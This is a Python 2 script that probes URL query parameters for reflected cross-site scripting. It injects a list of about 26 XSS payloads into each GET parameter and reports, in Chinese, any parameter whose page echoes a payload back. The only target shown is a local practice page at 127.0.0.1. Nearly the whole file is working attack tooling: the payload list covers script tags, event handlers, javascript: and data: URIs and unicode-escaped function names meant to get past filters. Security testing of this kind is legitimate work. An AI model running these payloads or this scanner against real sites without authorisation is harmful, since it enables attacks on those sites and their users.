# coding:utf-8
from string import whitespace
import urllib
import requests
requests.packages.urllib3.disable_warnings()
import re
import urlparse
import mechanize
import httplib
from bs4 import BeautifulSoup
import multiprocessing
import random
import sys
reload(sys)
sys.setdefaultencoding('utf-8')



payload_1 = ['</script>"><script>prompt(1)</script>', ' and 1=2 <script>alert(1)</script>','</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>', '"><img src=x onerror=prompt(1)>', '"><svg/onload=prompt(1)>', '"><iframe/src=javascript:prompt(1)>', '"><h1 onclick=prompt(1)>Clickme</h1>', '"><a href=javascript:prompt(1)>Clickme</a>', '"><a href="javascript:confirm%28 1%29">Clickme</a>', '"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>', '"><textarea autofocus onfocus=prompt(1)>', '"><a/href=javascript&colon;co\\u006efir\\u006d&#40;&quot;1&quot;&#41;>clickme</a>', '"><script>co\\u006efir\\u006d`1`</script>', '"><ScRiPt>co\\u006efir\\u006d`1`</ScRiPt>', '"><img src=x onerror=co\\u006efir\\u006d`1`>', '"><svg/onload=co\\u006efir\\u006d`1`>', '"><iframe/src=javascript:co\\u006efir\\u006d%28 1%29>', '"><h1 onclick=co\\u006efir\\u006d(1)>Clickme</h1>', '"><a href=javascript:prompt%28 1%29>Clickme</a>', '"><a href="javascript:co\\u006efir\\u006d%28 1%29">Clickme</a>', '"><textarea autofocus onfocus=co\\u006efir\\u006d(1)>', '"><details/ontoggle=co\\u006efir\\u006d`1`>clickmeonchrome', '"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme', '"><img/src=x%0Aonerror=prompt`1`>', '"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">', '"><h1/ondrag=co\\u006efir\\u006d`1`)>DragMe</h1>']


def GET(url):
    level = 1
    print 'GET Level %s : '%level + url
    try:
        try:
            site = url
            finalurl = urlparse.urlparse(site)
            urldata = urlparse.parse_qsl(finalurl.query)
            domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
            domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
            connection = httplib.HTTPConnection(domain)
            connection.connect()
            url = site
            paraname = []
            paravalue = []
            payloads = []
            if level == 1:
                payloads = payload_1

            o = urlparse.urlparse(site)
            parameters = urlparse.parse_qs(o.query, keep_blank_values=True)
            path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
                site).path
            for para in parameters:  # Arranging parameters and values.
                for i in parameters[para]:
                    paraname.append(para)
                    paravalue.append(i)
            fpar = []
            progress = 0
            for pn, pv in zip(paraname, paravalue):  # Scanning the parameter.
                fpar.append(str(pn))
                for x in payloads:  #
                    validate = x.translate(None, whitespace)
                    if validate == "":
                        progress = progress + 1
                    else:
                        progress = progress + 1
                        enc = urllib.quote_plus(x)
                        data = path + "?" + pn + "=" + pv + enc
                        page = urllib.urlopen(data)
                        sourcecode = page.read()
                        if x in sourcecode:
                            print '存在XSS漏洞'
                            print ('检测网址 : ' + url + '\n')
                            print ('提交方式 : GET' + '\n')
                            print ('漏洞参数 : ' + pn + '\n')
                            print ('攻击载荷 : ' + x + '\n')
                            print ('------------------------------------\n')
        except:
            pass
    except:
        pass
GET('http://127.0.0.1/xss/level1.php?name=test')


